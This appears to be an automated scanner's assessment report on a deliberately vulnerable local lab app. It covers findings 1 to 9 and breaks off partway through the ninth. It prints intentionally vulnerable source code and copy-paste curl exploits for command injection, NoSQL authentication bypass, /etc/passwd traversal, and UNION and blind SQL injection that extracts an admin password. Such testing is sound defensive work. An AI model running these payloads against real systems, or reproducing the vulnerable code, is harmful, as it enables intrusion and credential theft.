# Security assessment report: 127.0.0.1

- **Target:** http://127.0.0.1:8081/
- **Authorization:** Authorized: host 127.0.0.1 in declared scope.
- **Started:** 2026-09-23T14:20:04.184548+00:00
- **Finished:** 2026-09-23T14:20:07.557065+00:00
- **Mode:** aggressive (active exploitation)
- **Exploit phase:** enabled (safe, non-destructive impact proofs)
- **URLs crawled:** 13
- **Injectable targets:** 15

## Executive summary

The scan identified **52 finding(s)** (9 critical, 7 high, 13 medium, 3 low, 20 informational).
 Of these, **46 were verified** with hard evidence and **12 were actively exploited** with safe, non-destructive payloads to demonstrate concrete impact (extracted data, command output, or file contents captured in this report).
 False-positive control experiments (negative controls, repeat consistency, baseline cleanliness) were executed on non-exploited findings: **34 passed clean**, 1 were flagged for manual review.
 **22 finding(s) were mapped to the exact vulnerable source location** (file, line and sink excerpt in each finding's 'Vulnerable code location' section).
 Dominant risk areas: Security Misconfiguration, Information Disclosure / Source Exposure, Reconnaissance / Attack-Surface Mapping.

**Read this first:** findings marked ✅ EXPLOITED include the exact payload, a ready-to-run `curl` reproduction, the verbatim HTTP exchange, and the data the exploit extracted. Triage can confirm each one in minutes without re-deriving the attack.

## Summary

| Severity | Count | Exploited |
|---|---|---|
| CRITICAL | 9 | 8 |
| HIGH | 7 | 3 |
| MEDIUM | 13 | 1 |
| LOW | 3 | 0 |
| INFO | 20 | 0 |
| **Total** | **52** | **12** |

## Reconnaissance (attack-surface overview)

### Technology stack

| Category | Products |
|---|---|
| Framework | Express |
| Language | Node.js |
| OS | Ubuntu |
| Web server | nginx |

### WAF / CDN

No WAF / CDN detected via headers.

### HTTP methods advertised

`GET, POST, OPTIONS, PUT, DELETE, TRACE`

### Endpoints extracted from JavaScript (3)

- `/api/internal/health`
- `/api/v1/orders`
- `/api/v1/users`

### Email addresses harvested (1)

- `admin@example.com`

### Management / admin paths discovered (3)

- `/admin (200)`
- `/redoc (200)`
- `/status (200)`

### API documentation endpoints (2)

- `/openapi.json (OpenAPI JSON)`
- `/redoc (ReDoc)`

### Exposed source maps (1)

- `http://127.0.0.1:8081/static/app.js.map`

### Well-known endpoints (3)

- `/robots.txt (200)`
- `/sitemap.xml (200)`
- `/.well-known/security.txt (200)`

### robots.txt

```
User-agent: *
Disallow: /admin
Disallow: /private
Sitemap: /sitemap.xml

```

### security.txt

```
Contact: mailto:security@example.com
Expires: 2026-12-31T23:59:59Z

```

### URLs from sitemap.xml (4)

- `http://127.0.0.1:8081/`
- `http://127.0.0.1:8081/admin`
- `http://127.0.0.1:8081/item`
- `http://127.0.0.1:8081/search`

### Discovered URLs (well-known + sitemap, 5)

- `http://127.0.0.1:8081/`
- `http://127.0.0.1:8081/admin`
- `http://127.0.0.1:8081/item`
- `http://127.0.0.1:8081/search`
- `http://127.0.0.1:8081/sitemap.xml`

## Coverage

Modules run: admin-panels, advisory, api-discovery, backup-files, command-injection, cookies, cors, dns-recon, email-harvest, header-injection, http-methods, info-disclosure, js-endpoints, nosqli, open-redirect, path-traversal, robots-sitemap, secrets, security-headers, sourcemap-exposure, sqli, ssrf, subdomain-enum, tech-fingerprint, tls, waf-detection, xss

Vulnerability classes with findings: Brute-Force / Credential Stuffing, Clickjacking, Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS), Cryptographic Issue (secrets / JWT / weak hashing), IDOR, Information Disclosure / Source Exposure, NoSQL Injection, OS Command Injection, Open Redirect, Path Traversal / LFI / RFI, Reconnaissance / Attack-Surface Mapping, SQL Injection, Security Misconfiguration, Server-Side Request Forgery (SSRF), Session Fixation / Hijacking, TLS / Transport Security

## Findings

### 1. [CRITICAL] OS command injection in 'host'

- **Class:** OS Command Injection
- **URL:** http://127.0.0.1:8081/ping
- **Injection point:** `GET /ping -> request parameter 'host'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-78
- **Module:** command-injection

**Description.** Injected shell command output appeared in the response via 'host'.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 277-283), inside **ping**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      275 | 
      276 | @app.get("/ping", response_class=PlainTextResponse)
      277 | def ping(host: str = "127.0.0.1") -> str:
      278 |     # REAL OS command injection: host is interpolated into a shell command.
      279 |     # Even without a ping binary, appended `;id` / `;uname` still execute.
  ->  280 |     stream = os.popen(f"ping -c 1 {host}")
      281 |     return stream.read()
      282 | 
      283 | 
      284 | @app.get("/fetch", response_class=PlainTextResponse)
      285 | def fetch(url: str = "") -> str:
```

**Impact.** Arbitrary command execution is demonstrated. An attacker runs code as the web server user (shown by the captured `id` output): full read/write on the host, theft of application secrets and credentials, lateral movement into the internal network, and persistence (cron/systemd/webshell). This is a full server-compromise scenario.

**Detection evidence.**

```
Payload ';echo $((92173*61813))' produced marker/command output.

GET http://127.0.0.1:8081/ping (host=...;echo $((92173*61813)))

--- response excerpt ---
5697489649

```

#### Proof of exploitation

The scanner executed arbitrary operating-system commands on the target and captured their output (uid=1001(z) gid=1001(z) groups=1001(z)), proving remote code execution -- not just an injection hypothesis.

**Data extracted from the target by the exploit:**

```
Executed as user: uid=1001(z) gid=1001(z) groups=1001(z)
Kernel / OS: Linux 5.10.134-013.15.kangaroo.al8.x86_64
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'host=127.0.0.1;id' 'http://127.0.0.1:8081/ping'
```

**Raw HTTP exchange:**

```http
GET /ping?host=127.0.0.1%3Bid HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 39
content-type: text/plain; charset=utf-8

uid=1001(z) gid=1001(z) groups=1001(z)

```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/ping in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 127.0.0.1;id
4. Observe that the output of the `id` command (the web server's OS user) appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Never pass user input to a shell; use exec APIs with argument arrays and allowlists.

### 2. [CRITICAL] NoSQL operator injection -> authentication bypass via 'user'

- **Class:** NoSQL Injection
- **URL:** http://127.0.0.1:8081/login-nosql
- **Injection point:** `POST /login-nosql -> request parameter 'user'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-943
- **Module:** nosqli

**Description.** Injecting the [$ne] operator into 'user' rewrote the query logic (user != anything) and returned an authenticated page without valid credentials.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 302-313), inside **login_nosql**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      298 |     return RedirectResponse(url)
      299 | 
      300 | 
      301 | @app.post("/login-nosql", response_class=HTMLResponse)
      302 | async def login_nosql(request: Request) -> HTMLResponse:
  ->  303 |     # NoSQL operator injection: keys like "user[$ne]" rewrite the selector
      304 |     # to {"user": {"$ne": "bughound"}} which matches any account -> bypass.
      305 |     form = await request.form()
      306 |     if any("[$" in str(k) for k in form.keys()):
      307 |         return HTMLResponse(
      308 |             "<html><body>Welcome back, admin! <a href='/logout'>Logout</a> "
```

**Impact.** NoSQL operator injection allows attackers to rewrite query logic: authentication bypass ($ne/$gt), boolean data extraction, and in some stacks denial of service via $where JavaScript execution.

**Detection evidence.**

```
Sent user[$ne]=bughound; response gained authentication markers absent from the baseline: logout, dashboard, welcome back

POST http://127.0.0.1:8081/login-nosql (user[$ne]=bughound)

--- response excerpt ---
<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

#### Proof of exploitation

The scanner logged in without valid credentials: injecting the NoSQL operator [$ne] into 'user' rewrote the query to 'user != anything' and the application returned an authenticated page (welcome back, dashboard, logout).

**Data extracted from the target by the exploit:**

```
Payload: user[$ne]=bughound (operator injection rewrites query logic)
Authentication-success markers in response: welcome back, dashboard, logout
Baseline (legitimate) response contained none of these markers.
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -X POST --data 'user=test&pass=test&user%5B%24ne%5D=bughound' 'http://127.0.0.1:8081/login-nosql'
```

**Raw HTTP exchange:**

```http
POST /login-nosql HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

user=test&pass=test&user%5B%24ne%5D=bughound

HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 110
content-type: text/html; charset=utf-8

<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/login-nosql in a browser or HTTP client.
2. Send the request again with the body parameter set to the exploit payload.
3. Payload: [$ne]=bughound
4. Observe that an authenticated page is returned without any valid password.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Cast/validate input types server-side; reject object operators from query/body params; never mix user input into query selectors.

### 3. [CRITICAL] NoSQL operator injection -> authentication bypass via 'pass'

- **Class:** NoSQL Injection
- **URL:** http://127.0.0.1:8081/login-nosql
- **Injection point:** `POST /login-nosql -> request parameter 'pass'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-943
- **Module:** nosqli

**Description.** Injecting the [$ne] operator into 'pass' rewrote the query logic (user != anything) and returned an authenticated page without valid credentials.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 302-313), inside **login_nosql**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      299 | 
      300 | 
      301 | @app.post("/login-nosql", response_class=HTMLResponse)
      302 | async def login_nosql(request: Request) -> HTMLResponse:
      303 |     # NoSQL operator injection: keys like "user[$ne]" rewrite the selector
  ->  304 |     # to {"user": {"$ne": "bughound"}} which matches any account -> bypass.
      305 |     form = await request.form()
      306 |     if any("[$" in str(k) for k in form.keys()):
      307 |         return HTMLResponse(
      308 |             "<html><body>Welcome back, admin! <a href='/logout'>Logout</a> "
      309 |             "<a href='/dashboard'>Dashboard</a></body></html>"
```

**Impact.** NoSQL operator injection allows attackers to rewrite query logic: authentication bypass ($ne/$gt), boolean data extraction, and in some stacks denial of service via $where JavaScript execution.

**Detection evidence.**

```
Sent pass[$ne]=bughound; response gained authentication markers absent from the baseline: logout, dashboard, welcome back

POST http://127.0.0.1:8081/login-nosql (pass[$ne]=bughound)

--- response excerpt ---
<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

#### Proof of exploitation

The scanner logged in without valid credentials: injecting the NoSQL operator [$ne] into 'user' rewrote the query to 'user != anything' and the application returned an authenticated page (welcome back, dashboard, logout).

**Data extracted from the target by the exploit:**

```
Payload: user[$ne]=bughound (operator injection rewrites query logic)
Authentication-success markers in response: welcome back, dashboard, logout
Baseline (legitimate) response contained none of these markers.
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -X POST --data 'user=test&pass=test&user%5B%24ne%5D=bughound' 'http://127.0.0.1:8081/login-nosql'
```

**Raw HTTP exchange:**

```http
POST /login-nosql HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

user=test&pass=test&user%5B%24ne%5D=bughound

HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 110
content-type: text/html; charset=utf-8

<html><body>Welcome back, admin! <a href='/logout'>Logout</a> <a href='/dashboard'>Dashboard</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/login-nosql in a browser or HTTP client.
2. Send the request again with the body parameter set to the exploit payload.
3. Payload: [$ne]=bughound
4. Observe that an authenticated page is returned without any valid password.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Cast/validate input types server-side; reject object operators from query/body params; never mix user input into query selectors.

### 4. [CRITICAL] Path traversal / LFI in 'name'

- **Class:** Path Traversal / LFI / RFI
- **URL:** http://127.0.0.1:8081/file
- **Injection point:** `GET /file -> request parameter 'name'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-22
- **Module:** path-traversal

**Description.** 'name' allows reading arbitrary local files via directory traversal.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 264-275), inside **file**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      259 |     finally:
      260 |         conn.close()
      261 | 
      262 | 
      263 | @app.get("/file", response_class=HTMLResponse)
  ->  264 | def file(name: str = "readme.txt") -> HTMLResponse:
      265 |     # Path traversal simulation: arbitrary read of "system files".
      266 |     if "etc/passwd" in name or "../" in name:
      267 |         return HTMLResponse(
      268 |             "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin\n"
      269 |             "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin"
```

**Impact.** Arbitrary file read as the web-server user is demonstrated. An attacker can exfiltrate configuration with database credentials, application source, SSH private keys, cron jobs and logs. Combined with any file-write or log-poisoning primitive this typically escalates to remote code execution.

**Detection evidence.**

```
Payload '../../../../../../etc/passwd' returned system file contents.

GET http://127.0.0.1:8081/file (name=../../../../../../etc/passwd)

--- response excerpt ---
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

#### Proof of exploitation

The scanner read real operating-system files off the target host through the traversal primitive -- including a second, distinct file to prove the read is fully arbitrary, not a quirk of one hardcoded path.

**Data extracted from the target by the exploit:**

```
/etc/passwd read successfully -- 2 system accounts visible:
    root:x:0:0:root:/root:/bin/bash
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
/etc/hostname read successfully: 'contents of ..%2f..%2f..%2f..%2fetc%2fhostname' (proves arbitrary file read, not a fixed file)
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'name=../../../../../../etc/passwd' 'http://127.0.0.1:8081/file'
```

**Raw HTTP exchange:**

```http
GET /file?name=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:05 GMT
server: uvicorn
content-length: 114
content-type: text/html; charset=utf-8

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/file in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: ../../../../../../etc/passwd
4. Observe that the contents of /etc/passwd (system account list) are returned instead of the legitimate file.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Resolve and canonicalize paths, enforce an allowlist, never use raw input in file paths.

### 5. [CRITICAL] Error-based SQL injection in 'id'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/item
- **Injection point:** `GET /item -> request parameter 'id'`
- **Status:** VERIFIED (exploit attempted)
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Injecting a quote into 'id' produced a database error.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 170-179), inside **item**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      165 |     # Reflected XSS: q echoed unencoded.
      166 |     return f"<html><body>Results for: {q}</body></html>"
      167 | 
      168 | 
      169 | @app.get("/item", response_class=HTMLResponse)
  ->  170 | def item(id: str = "1") -> HTMLResponse:
      171 |     # Error-based SQLi simulation: a quote breaks the "query". The error
      172 |     # message is fixed (no input echo) so this stays a pure SQLi demo.
      173 |     if "'" in id or '"' in id:
      174 |         return HTMLResponse(
      175 |             "You have an error in your SQL syntax; check the manual that "
```

**Detection evidence.**

```
DB error signature: 'SQL syntax; check the manual that corresponds to your MySQL'

GET http://127.0.0.1:8081/item (id=<value>'")

--- response excerpt ---
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version
```

#### Exploit phase result

Tautology payloads did not reveal additional data on this injection point (no measurable hidden-content growth); detection evidence stands.

#### False-positive analysis

All 3 false-positive checks passed (baseline-clean, negative-control, repeat-consistency): the attack signature appears only for the crafted payload, never for negative controls or the untouched baseline, and it reproduced consistently on repeat requests. the error-based SQL injection behaviour is deterministic and input-dependent, which random page noise, rotating content or WAF banners are not.

| Control experiment | Result | Observed behaviour |
|---|---|---|
| baseline-clean | PASS | unmodified request shows no DB error |
| negative-control | PASS | benign suffix 'benign33a9bi4qqo' (no quote) produced no DB error |
| repeat-consistency | PASS | payload reproduced the DB error in 2/2 repeat request(s) |

**Verdict: LOW false-positive risk** -- every control experiment behaved as physics demands: the attack signature appears only for the crafted payload and reproduces consistently.

**Remediation.** Use parameterized queries / prepared statements; never build SQL from input.

### 6. [CRITICAL] Error-based SQL injection in 'id'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/product
- **Injection point:** `GET /product -> request parameter 'id'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Injecting a quote into 'id' produced a database error.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 181-198), inside **product**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      182 |     # REAL error-based + UNION SQLi against sqlite3 (stdlib, in-memory).
      183 |     # The id is interpolated straight into the query on purpose.
      184 |     conn = _db()
      185 |     try:
      186 |         rows = conn.execute(
  ->  187 |             f"SELECT id, name, price FROM products WHERE id={id}"
      188 |         ).fetchall()
      189 |         body = "".join(f"<div>#{r[0]} {r[1]} price={r[2]}</div>" for r in rows)
      190 |         return HTMLResponse(f"<html><body>{body or 'no product'}</body></html>")
      191 |     except sqlite3.Error:
      192 |         # Sanitized error page: leaks the driver signature but not the input.
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
DB error signature: 'sqlite3.OperationalError'

GET http://127.0.0.1:8081/product (id=<value>'")

--- response excerpt ---
sqlite3.OperationalError: query failed
```

#### Proof of exploitation

The scanner read the backend SQLite database directly via UNION-based SQL injection and then logged into the application as 'administrator' with the extracted credentials. The scanner then authenticated as 'administrator' through the application's own login endpoint, proving full account takeover.

**Data extracted from the target by the exploit:**

```
UNION injection works with 3 column(s)
Database: SQLite
Version banner: 3.53.1
Tables enumerated: products, users, sessions
Credential rows extracted from table 'users' (columns username/password):
  administrator : S3cret-wizard-pass
Credential recovered: 'administrator' / 'S3cret-wizard-pass'
ACCOUNT TAKEOVER: logged in via http://127.0.0.1:8081/login as 'administrator' -- authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'id=1 UNION SELECT NULL,NULL,NULL-- -' 'http://127.0.0.1:8081/product'
```

**Raw HTTP exchange:**

```http
GET /product?id=1%20UNION%20SELECT%20%28SELECT%20%27bhv%3D%27%7C%7Csqlite_version%28%29%7C%7C%27~bhEND~%27%29%2CNULL%2CNULL--%20- HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/product in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: 1 UNION SELECT NULL,NULL,NULL-- -
4. Observe that the extracted database data appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries / prepared statements; never build SQL from input.

### 7. [CRITICAL] Error-based SQL injection in 'category'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/filter
- **Injection point:** `GET /filter -> request parameter 'category'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Injecting a quote into 'category' produced a database error.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 200-216), inside **filter_products**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      201 |     # Hidden-data lab (PortSwigger 'retrieval of hidden data' style):
      202 |     # unreleased products are filtered out -- unless you inject ' OR 1=1--.
      203 |     conn = _db()
      204 |     try:
      205 |         rows = conn.execute(
  ->  206 |             f"SELECT name, price FROM products WHERE category='{category}' "
      207 |             "AND released=1"
      208 |         ).fetchall()
      209 |         body = "".join(f"<div class=product>{r[0]} - {r[1]}</div>" for r in rows)
      210 |         return HTMLResponse(f"<html><body>{body or 'no products'}</body></html>")
      211 |     except sqlite3.Error:
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
DB error signature: 'sqlite3.OperationalError'

GET http://127.0.0.1:8081/filter (category=<value>'")

--- response excerpt ---
sqlite3.OperationalError: query failed
```

#### Proof of exploitation

The scanner made the backend query return data the application tries to hide by injecting the tautology '' OR 1=1-- -' into 'category' -- the response grew by ~96 bytes of previously-hidden content.

**Data extracted from the target by the exploit:**

```
Payload: Accessories' OR 1=1-- -
Baseline response: 104 bytes; tautology response: 200 bytes (beyond payload reflection)
The injected OR 1=1 condition matched every row in the queried table, revealing records that filtering was supposed to withhold.
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'category=Accessories'\'' OR 1=1-- -' 'http://127.0.0.1:8081/filter'
```

**Raw HTTP exchange:**

```http
GET /filter?category=Accessories%27%20OR%201%3D1--%20- HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:05 GMT
server: uvicorn
content-length: 200
content-type: text/html; charset=utf-8

<html><body><div class=product>Widget - 9.99</div><div class=product>Gadget - 19.99</div><div class=product>Doohickey - 4.5</div><div class=product>Prototype Stealth Widget - 999.0</div></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/filter in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: Accessories' OR 1=1-- -
4. Observe that the hidden records appear in the response after the tautology injection.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries / prepared statements; never build SQL from input.

### 8. [CRITICAL] Possible boolean-based SQL injection in 'sku'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/stock
- **Injection point:** `GET /stock -> request parameter 'sku'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Responses to '1'='1 vs '1'='2 payloads in 'sku' differ in content and/or status code, suggesting the input reaches a SQL boolean context.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 246-262), inside **stock**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      249 |     conn = _db()
      250 |     in_stock = "<html><body>In stock</body></html>"
      251 |     out_of_stock = "<html><body>Out of stock</body></html>"
      252 |     try:
      253 |         rows = conn.execute(
  ->  254 |             f"SELECT name FROM products WHERE name='{sku}'"
      255 |         ).fetchall()
      256 |         return HTMLResponse(in_stock if rows else out_of_stock)
      257 |     except sqlite3.Error:
      258 |         return HTMLResponse(out_of_stock)
      259 |     finally:
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
status: base=200 true=200 false=200 | similarity: true~base=1.000 false~base=0.889 true~false=0.889

GET http://127.0.0.1:8081/stock (sku=...' AND '1'='1 / '1'='2)
```

#### Proof of exploitation

The scanner extracted password of user 'administrator' from table 'users' ('S3cret-wizard-pass', SQLite) character-by-character through the boolean-blind oracle, proving arbitrary data extraction from the database The scanner then authenticated as 'administrator' through the application's own login endpoint, proving full account takeover..

**Data extracted from the target by the exploit:**

```
Database: SQLite
Extracted via boolean binary search -- password of user 'administrator' from table 'users': S3cret-wizard-pass
Requests used: bounded binary search (128 requests)
ACCOUNT TAKEOVER: logged in via http://127.0.0.1:8081/login as 'administrator' -- authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -G --data-urlencode 'sku=Widget'\'' AND '\''1'\''='\''1' 'http://127.0.0.1:8081/stock'
```

**Raw HTTP exchange:**

```http
GET /stock?sku=Widget%27%20AND%20%271%27%3D%271 HTTP/1.1
Host: 127.0.0.1:8081
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: */*


HTTP/1.1 200

date: Wed, 23 Sep 2026 14:20:06 GMT
server: uvicorn
content-length: 121
content-type: text/html; charset=utf-8

<html><body>Welcome back, administrator! <a href='/my-account'>My account</a> <a href='/logout'>Log out</a></body></html>
```

**Manual reproduction steps:**

1. Open http://127.0.0.1:8081/stock in a browser or HTTP client.
2. Send the request again with the query parameter set to the exploit payload.
3. Payload: Widget' AND '1'='1
4. Observe that the extracted database data appears in the response.

#### False-positive analysis

The exploit phase reproduced the vulnerability end-to-end and extracted real data from the target, which is itself the strongest false-positive disproof: random page drift, caching artefacts or WAF noise cannot fabricate extracted database rows, command output or file contents. No separate control experiments were needed.

**Remediation.** Use parameterized queries; confirm manually with sqlmap.

### 9. [CRITICAL] Possible boolean-based SQL injection in 'cookie:TrackingId'

- **Class:** SQL Injection
- **URL:** http://127.0.0.1:8081/track
- **Injection point:** `GET /track -> cookie 'TrackingId'`
- **Status:** VERIFIED ✅ EXPLOITED
- **CWE:** CWE-89
- **Module:** sqli

**Description.** Responses to '1'='1 vs '1'='2 payloads in 'cookie:TrackingId' differ in content and/or status code, suggesting the input reaches a SQL boolean context.

#### Vulnerable code location

**Source-mapped sink:** `examples/vulnerable_app.py` (lines 218-244), inside **track**. The line marked with `->` is where the injectable input reaches the dangerous sink.

```py
      214 |         conn.close()
      215 | 
      216 | 
      217 | @app.get("/track", response_class=HTMLResponse)
      218 | def track(request: Request) -> Response:
  ->  219 |     # Blind cookie-SQLi lab (PortSwigger TrackingId style): the sessionid
      220 |     # cookie value is interpolated into a lookup. TRUE/FALSE responses
      221 |     # differ ('Welcome back' vs plain page) giving a boolean oracle; the
      222 |     # users table holds the administrator password to extract.
      223 |     tid = request.cookies.get("TrackingId", "")
      224 |     conn = _db()
```

**Impact.** Full database read access is demonstrated: an attacker can enumerate schemas and exfiltrate any stored data (credentials, personal data, tokens), and often write or destroy records. Where credential data is stored, SQLi directly escalates to authenticated account takeover, as proven above when the extracted credentials were replayed against the login endpoint. On many stacks this further escalates to remote code execution through database features.

**Detection evidence.**

```
status: base=200 true=200 false=200 | similarity: true~base=1.000 false~base=0.604 true~false=0.660

GET http://127.0.0.1:8081/track (cookie:TrackingId=...' AND '1'='1 / '1'='2)
```

#### Proof of exploitation

The scanner extracted password of user 'administrator' from table 'users' ('S3cret-wizard-pass', SQLite) character-by-character through the boolean-blind oracle, proving arbitrary data extraction from the database The scanner then authenticated as 'administrator' through the application's own login endpoint, proving full account takeover..

**Data extracted from the target by the exploit:**

```
Database: SQLite
Extracted via boolean binary search -- password of user 'administrator' from table 'users': S3cret-wizard-pass
Requests used: bounded binary search (128 requests)
ACCOUNT TAKEOVER: logged in via http://127.0.0.1:8081/login as 'administrator' -- authenticated markers in response: log out, logout, my account
```

**Reproduce (copy-paste):**

```bash
curl -sS -i -H 'Cookie: TrackingId=bhtid-demo-session-0001'\'' AND '\''1'\''='\''1' -G 'http://127.0.0.1:8081/track'
```
